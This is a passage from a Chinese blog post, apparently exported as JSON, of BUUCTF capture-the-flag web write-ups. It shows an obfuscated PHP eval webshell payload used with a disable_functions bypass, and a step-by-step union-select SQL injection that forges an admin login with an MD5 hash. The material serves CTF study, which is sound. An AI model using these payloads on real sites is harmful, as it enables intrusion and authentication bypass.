代码来执行\n</code></pre>\n<p>然后再赋值</p>\n<pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);\n\n//注意后面要有；，代表php代码结束\n//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反\n\n等同于\n\n?code=(assert)(eval($_REQUEST[8]));\n\n(assert)因为是assert是函数，被当作函数执行，于是因为断言(eval($_REQUEST[8]))，所以把eval($_REQUEST[8])当作php执行，于是就可以拿到shell了\n</code></pre>\n<pre><code>蚁剑连接\nhttp://url?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);\n</code></pre>\n<p>但是发现flag是空的</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181221552.png\" alt=\"image-20220903181221552\"></p>\n<p>看了其他大佬的wp才知道，需要蚁剑插件<code>disable_functions</code>，禁止网站的函数，防止其阻止读取flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181348649.png\" alt=\"image-20220903181348649\"></p>\n<p>再在主页右键</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181431745.png\" alt=\"image-20220903181431745\"></p>\n<p>模式选择</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181451266.png\" alt=\"image-20220903181451266\"></p>\n<p>然后点击开始</p>\n<p>终端输入</p>\n<p><code>/readflag</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220903181528195.png\" alt=\"image-20220903181528195\"></p>\n<p>得到flag</p>\n<h2 id=\"12-GXYCTF2019-BabySQli\"><a href=\"#12-GXYCTF2019-BabySQli\" class=\"headerlink\" title=\"12.[GXYCTF2019]BabySQli\"></a>12.[GXYCTF2019]BabySQli</h2><h3 id=\"1-题目描述-9\"><a href=\"#1-题目描述-9\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-9\"><a href=\"#2-wp-9\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>开始是一个登录框</p>\n<p><img src=\"/post/wp-buuctf/image-20220909203922998.png\" alt=\"image-20220909203922998\"></p>\n<p>我们随便输入一个账号密码</p>\n<pre><code>账号：admin\n密码：123456\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220909204018695.png\" alt=\"image-20220909204018695\"></p>\n<p>报错，看来用户名没错，密码错误</p>\n<p>查看源码看看</p>\n<p><img src=\"/post/wp-buuctf/image-20220909204046072.png\" alt=\"image-20220909204046072\"></p>\n<p>发现有一串加密字符，看起来像base</p>\n<p>先用<code>base32</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220909204202994.png\" alt=\"image-20220909204202994\"></p>\n<p>看起来就是<code>base32+base64</code>混合编码，再用<code>base64</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220909204325138.png\" alt=\"image-20220909204325138\"></p>\n<hr>\n<p>当然看不出来，直接无脑<code>ciphey</code>，也可以，当然还是需要了解不同编码和加密字符的特点</p>\n<p><img src=\"/post/wp-buuctf/image-20220909204746167.png\" alt=\"image-20220909204746167\"></p>\n<p>也可以得到解码结果</p>\n<hr>\n<p>由</p>\n<pre><code>select * from user where username = &#39;$name&#39;\n</code></pre>\n<p>可知，sql注入点在Username处，且为单引号闭合</p>\n<p>于是我们尝构造注入</p>\n<pre><code>name=admin&#39;%20and%201=1#&amp;pw=123456\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220909205630033.png\" alt=\"image-20220909205630033\"></p>\n<p>发现有的字符被过滤了，我们可以用fuzz爆破测试看看，也可以一个一个试</p>\n<p>我这里先爆破试试（建议爆破还是慢一些，后面直接太多请求，服务器不发返回包了）</p>\n<p>大概统计一下</p>\n<pre><code>or\n()\n=\n</code></pre>\n<p>所以我们只有先试试联合注入</p>\n<pre><code>由于过滤了or\n所以我们不能使用order by来判断列数，可以用联合注入，利用select的结果来判断\n</code></pre>\n<p>先试试<code>select 1,2</code></p>\n<pre><code>name=admin&#39;%20union%20select%201,2#&amp;pw=123456\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220909214254664.png\" alt=\"image-20220909214254664\"></p>\n<p>发现报错，列数有问题</p>\n<p>再试试<code>select 1,2,3</code></p>\n<pre><code>name=admin&#39;%20union%20select%201,2,3#&amp;pw=123456\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220909214345515.png\" alt=\"image-20220909214345515\"></p>\n<p>发现虽然没有报错，但是也没有直接回显</p>\n<p>再试试<code>select 1,2,3,4</code></p>\n<p>又报错</p>\n<p><img src=\"/post/wp-buuctf/image-20220909214506605.png\" alt=\"image-20220909214506605\"></p>\n<p><strong>所以得出<code>列数一共有3列</code></strong></p>\n<p><strong>根据经验这三列，分别是</strong><u><strong>id,username,password</strong></u></p>\n<p>我们可以用以下语句进行确认</p>\n<pre><code>name=-1&#39;%20union%20select%20”admin“,2,3#&amp;pw=123456   \n//把第一位，即1的位置换成用户名admin\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220910085003536.png\" alt=\"image-20220910085003536\"></p>\n<p>提示用户名错误，看来用户名不在第一位</p>\n<pre><code>name=-1&#39;%20union%20select%201,&quot;admin&quot;,3#&amp;pw=123456\n//把第二位，即2的位置换成用户名admin\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220910085115686.png\" alt=\"image-20220910085115686\"></p>\n<p>提示密码错误，看来用户名回显就在第二位</p>\n<p><strong>但是没有回显我们select的数据，可是如果用报错注入和盲注的话，()被过滤了，也不能用</strong></p>\n<p>所以我们只有考虑，怎么才可以登录上去</p>\n<p>首先这是一个sql注入的题目，密码不可能简单的爆破就可以解决</p>\n<p><strong>密码肯定是进行加密，最常见的密码加密就是md5</strong>，所以我们利用<code>md()</code>函数把我们的密码加密，再加上我们的用户名一起导入到题目的数据库里，即可完成登录</p>\n<p>注意因为<code>()</code>被过滤，所以只能先把密码进行md5加密，在导入，而不能直接用函数</p>\n<hr>\n<p>这里又有一个新的知识点</p>\n<p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。【union select】</strong></p>\n<p>在<code>Web-study</code>里写的详细</p>\n<p>下面简单说一下流程</p>\n<p>先把我们的密码123456利用md5加密</p>\n<p><img src=\"/post/wp-buuctf/image-20220910090640990.png\" alt=\"image-20220910090640990\"></p>\n<pre><code>e10adc3949ba59abbe56e057f20f883e\n</code></pre>\n<p>然后构造payload</p>\n<pre><code>name=-1&#39;%20union%20select%201,&quot;admin&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;#&amp;pw=123456\n\n/*\n联合注入的技巧，就是在使用union select时候，后面的数据如果不存在，就会生成一个虚拟的数据\n如上面的\n\n根据上面base编码结果，select * from user where username = &#39;$name&#39;\n\n我们利用union select 1,&quot;admin&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;\n\n因为user表里不存在id=1,username=admin,password=e10adc3949ba59abbe56e057f20f883e\n\n所以会生成一个一个数据插入表中\n*/\n/*\n当name参数进行sql注入，把数据插入user表中时\n后面password只要和明文一样，即可登录成功\n*/\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220910091405613.png\" alt=\"image-20220910091405613\"></p>\n<p>得到flag</p>\n<h2 id=\"13-护网杯-2018-easy-tornado\"><a href=\"#13-护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"13.[护网杯 2018]easy_tornado\"></a>13.[护网杯 2018]easy_tornado</h2><h3 id=\"1-题目描述-10\"><a href=\"#1-题目描述-10\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-10\"><a href=\"#2-wp-10\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3>","text":"web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间 Web1.[...","permalink":"/post/wp-buuctf","photos":[],"count_time":{"symbolsCount":"28k","symbolsTime":"25 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Web\"><span class=\"toc-text\">Web</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8\"><span class=\"toc-text\">1.[强网杯 2019]随便注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%EF%BC%89%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1）题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%EF%BC%89wp\"><span class=\"toc-text\">2）wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">堆叠注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2%EF%BC%9A%E9%A2%84%E5%A4%84%E7%90%86%E7%BB%95%E8%BF%87select%E9%99%90%E5%88%B6\"><span class=\"toc-text\">解题思路2：预处理绕过select限制</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%EF%BC%9Ahandler%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">解题思路3：handler绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#handler%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">handler基本用法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">实例</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-GXYCTF2019-Ping-Ping-Ping\"><span class=\"toc-text\">2.[GXYCTF2019]Ping Ping Ping</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2\"><span class=\"toc-text\">3.[MRCTF2020]你传你🐎呢</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-1\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-RoarCTF-2019-Easy-Calc\"><span class=\"toc-text\">4.[RoarCTF 2019]Easy Calc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-2\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL\"><span class=\"toc-text\">5.[极客大挑战 2019]HardSQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-3\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1\"><span class=\"toc-text\">6.[网鼎杯 2020 青龙组]AreUSerialz1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-HCTF-2018-admin\"><span class=\"toc-text\">7.[HCTF 2018]admin</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-4\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-ZJCTF-2019-NiZhuanSiWei\"><span class=\"toc-text\">8.[ZJCTF 2019]NiZhuanSiWei</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-5\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-SUCTF-2019-CheckIn\"><span class=\"toc-text\">9.[SUCTF 2019]CheckIn</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-6\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-GXYCTF2019-BabyUpload\"><span class=\"toc-text\">10.[GXYCTF2019]BabyUpload</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-7\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME\"><span class=\"toc-text\">11.[极客大挑战 2019]RCE ME</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-8\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-GXYCTF2019-BabySQli\"><span class=\"toc-text\">12.[GXYCTF2019]BabySQli</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-9\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado\"><span class=\"toc-text\">13.[护网杯 2018]easy_tornado</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-10\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-10\"><span class=\"toc-text\">2)wp</span></a></li></ol></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"攻防世界靶场wp","uid":"c1355e18e08f584a9698a2879b69aeba","slug":"wp-Gongfang","date":"2022-06-21T14:06:24.391Z","updated":"2023-10-04T15:10:59.861Z","comments":true,"path":"api/articles/wp-Gongfang.json","keywords":null,"cover":"/img/34.jpg","text":"这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下 ...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方...","permalink":"/post/wp-Gongfang","photos":[],"count_time":{"symbolsCount":"29k","symbolsTime":"26 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"web基础随记","uid":"8009cc0308ef2b434146ef92878679ee","slug":"Noteless","date":"2022-05-30T16:15:39.751Z","updated":"2023-10-04T13:21:45.987Z","comments":true,"path":"api/articles/Noteless.json","keywords":null,"cover":"/img/20.jpg","text":"随便记一下，大都常混淆或者易忘基础知识 网站连接重置，用清空缓存和Cookie解决今天在打buuctf靶场的时候遇到一个问题，就是当页面跳转时，会显示连接重置，...","permalink":"/post/Noteless","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"web","slug":"web","count":2,"path":"api/categories/web.json"}],"tags":[{"name":"daily","slug":"daily","count":2,"path":"api/tags/daily.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}